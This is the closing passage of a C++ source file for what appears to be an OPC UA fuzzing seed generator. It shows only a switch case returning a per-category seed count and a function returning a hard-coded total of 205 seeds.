        case SeedCategory::CVE_BASED: return 20;
        default: return 0;
    }
}

size_t SeedGenerator::getTotalSeedCount() {
    return 205;  // Sum of all categories
}

} // namespace OPCUAFuzzingSeeds
